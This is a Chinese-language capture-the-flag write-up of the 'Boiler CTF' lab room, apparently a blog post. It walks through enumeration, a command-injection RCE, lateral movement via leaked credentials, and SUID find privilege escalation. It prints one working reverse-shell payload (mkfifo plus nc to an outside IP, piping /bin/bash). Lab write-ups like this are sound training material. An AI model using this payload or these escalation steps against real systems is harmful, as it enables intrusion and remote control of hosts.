# Boiler CTF

中级CTF。只要枚举一下，你就会到达那里。

---

## 端口扫描

循例 nmap

![在这里插入图片描述](https://img-blog.csdnimg.cn/4c83f0e7ef2f45639f51f92b845615df.png)

当题目问我最高端口上开启什么服务的时候，我就知道要-p-了

![在这里插入图片描述](https://img-blog.csdnimg.cn/dea5cb09014e4f78944ff53de7d13f2c.png)

## FTP枚举

开了ftp，尝试用anonymous登录

![在这里插入图片描述](https://img-blog.csdnimg.cn/1a5748c9905044aeb5456c4bd993857e.png)

把文件下载，打开发现很像英语但又不是，别人说这是凯撒

![在这里插入图片描述](https://img-blog.csdnimg.cn/2d20b04e256f487fa7643f911a183eba.png)

用在线工具一位一位的移动，直到13次位移：

![在这里插入图片描述](https://img-blog.csdnimg.cn/8dd4aeb22d4b46429fa5400a44ebbab1.png)

好吧这个信息可能没什么用，但仍然强调了注意枚举


## Web枚举

前面nmap信息给出了Webmin版本，这里searchsploit找一手

![在这里插入图片描述](https://img-blog.csdnimg.cn/797aca2763ba4db6849f71506f6273b3.png)

扫80端口的目录：

![在这里插入图片描述](https://img-blog.csdnimg.cn/60910ebd20fa40b6a30e4b807bb8649f.png)

查看robots.txt发现一串数字，这是ascii十进制，转换能得到长得跟base64的东西，base64解码又获得一串md5，使用cmd5发现并没有什么卵用

![在这里插入图片描述](https://img-blog.csdnimg.cn/48ffe9e75d8742ecbc655e0cd703e3bf.png)

回到刚刚80端口的目录扫描 结果，我们访问joomla:

![在这里插入图片描述](https://img-blog.csdnimg.cn/4bf30bde8f704de9b5a6069fefcc1d31.png)

这里似乎并没有暴露出版本号，由于joomla是cms的根目录，这里再对/joomla扫一下

这里扫到非常多目录

![在这里插入图片描述](https://img-blog.csdnimg.cn/7874ee39b1e348e39108be0acd0fadc2.png)

## Reverse Shell

挨个看看，其中/_test有所发现

![在这里插入图片描述](https://img-blog.csdnimg.cn/b9395519ef6d456dad5943941a8d3466.png)

使用searchsploit，发现一个rce，虽然我们不知道版本号，但也值得尝试

![在这里插入图片描述](https://img-blog.csdnimg.cn/8e154a26e38a48be8204dc31ae768a4f.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/272f1ad350dd42b98b24b5cc57fd77a4.png)

这里直接reverse shell，payload:

	|+mkfifo+/tmp/f1%3bnc+10.14.39.48+8888+<+/tmp/f1+|+/bin/bash+>+/tmp/f1

![在这里插入图片描述](https://img-blog.csdnimg.cn/5e9761a33eed4034b6ea8e3365d65c93.png)

## 横向移动

发现log.txt，里面存在一组凭据

![在这里插入图片描述](https://img-blog.csdnimg.cn/dfa9459a0a5b4157bbac13951385bdc1.png)

但尝试登录pentest是失败的，查看/home目录有两个文件夹，可以尝试使用这些用户名来进行密码喷射

![在这里插入图片描述](https://img-blog.csdnimg.cn/efbf0fbd2bbc4e01af34da27b932e269.png)

在basterd家目录发现一个backup.sh，阅读该文件，将直接发现另一个账户的有效明文密码

![在这里插入图片描述](https://img-blog.csdnimg.cn/8fccc2de3b054d2480a7f3998f1364cc.png)

## 权限提升

sudo -l发现：

![在这里插入图片描述](https://img-blog.csdnimg.cn/6cb1fe5b2481452ba20d0aa9454a83ad.png)

然鹅这文件并不存在

![在这里插入图片描述](https://img-blog.csdnimg.cn/8357dddccf1645ea8478f2b136630e26.png)

但查找suid的时候发现了提权的老朋友们的其中之一 find

![在这里插入图片描述](https://img-blog.csdnimg.cn/d120b3ad374044e0ae1e2cf38fc167aa.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/48b966b3aed143788b24ccbad01a7d2b.png)

getroot

## 结束

其实这个房间整体比较简单，但重点偏向于**枚举**，不管是从端口扫描还是到后面横向移动和提权，几乎全程都是在枚举中发现的，这也说明能够说明了枚举的重要性